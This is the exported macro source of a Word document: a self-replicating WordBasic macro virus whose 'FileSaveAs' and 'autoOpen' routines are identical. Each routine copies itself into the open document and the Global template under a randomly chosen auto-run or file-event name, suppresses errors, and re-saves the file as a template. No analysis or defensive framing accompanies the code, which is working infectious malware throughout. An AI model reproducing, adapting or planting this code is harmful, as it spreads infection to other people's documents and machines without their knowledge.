   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "FileSaveAs"

   Public Sub MAIN()
   Dim x
   Dim rn$
   Dim y$
   On Error Resume Next
   WordBasic.FileSummaryInfo Update:=1
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSummaryInfo(False)
   WordBasic.CurValues.FileSummaryInfo dlg

   x = Rnd()
   If x < 0.1 Then
       rn$ = ":AutoOpen"
   ElseIf x < 0.2 Then
       rn$ = ":AutoClose"
   ElseIf x < 0.3 Then
       rn$ = ":AutoNew"
   ElseIf x < 0.4 Then
       rn$ = ":AutoExec"
   ElseIf x < 0.5 Then
       rn$ = ":AutoExit"
   ElseIf x < 0.6 Then
       rn$ = ":FileSaveAs"
   ElseIf x < 0.7 Then
       rn$ = ":FileOpen"
   ElseIf x < 0.8 Then
       rn$ = ":FileClose"
   ElseIf x < 0.9 Then
       rn$ = ":autoOpen"
   Else
       rn$ = ":FileExit"
   End If

   y$ = WordBasic.[MacroFileName$]() + ":" + WordBasic.[MacroName$](1, 1)
   WordBasic.MsgBox y$
   WordBasic.MsgBox dlg.Directory + "\" + dlg.FileName + rn$
   WordBasic.MsgBox "Global" + rn$

   WordBasic.MacroCopy y$, dlg.Directory + "\" + dlg.FileName + rn$
   WordBasic.MacroCopy y$, "Global" + rn$
   WordBasic.FileSaveAs Format:=1
   End Sub

   Attribute VB_Name = "autoOpen"

   Public Sub MAIN()
   Dim x
   Dim rn$
   Dim y$
   On Error Resume Next
   WordBasic.FileSummaryInfo Update:=1
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSummaryInfo(False)
   WordBasic.CurValues.FileSummaryInfo dlg

   x = Rnd()
   If x < 0.1 Then
       rn$ = ":AutoOpen"
   ElseIf x < 0.2 Then
       rn$ = ":AutoClose"
   ElseIf x < 0.3 Then
       rn$ = ":AutoNew"
   ElseIf x < 0.4 Then
       rn$ = ":AutoExec"
   ElseIf x < 0.5 Then
       rn$ = ":AutoExit"
   ElseIf x < 0.6 Then
       rn$ = ":FileSaveAs"
   ElseIf x < 0.7 Then
       rn$ = ":FileOpen"
   ElseIf x < 0.8 Then
       rn$ = ":FileClose"
   ElseIf x < 0.9 Then
       rn$ = ":autoOpen"
   Else
       rn$ = ":FileExit"
   End If

   y$ = WordBasic.[MacroFileName$]() + ":" + WordBasic.[MacroName$](1, 1)
   WordBasic.MsgBox y$
   WordBasic.MsgBox dlg.Directory + "\" + dlg.FileName + rn$
   WordBasic.MsgBox "Global" + rn$

   WordBasic.MacroCopy y$, dlg.Directory + "\" + dlg.FileName + rn$
   WordBasic.MacroCopy y$, "Global" + rn$
   WordBasic.FileSaveAs Format:=1
   End Sub
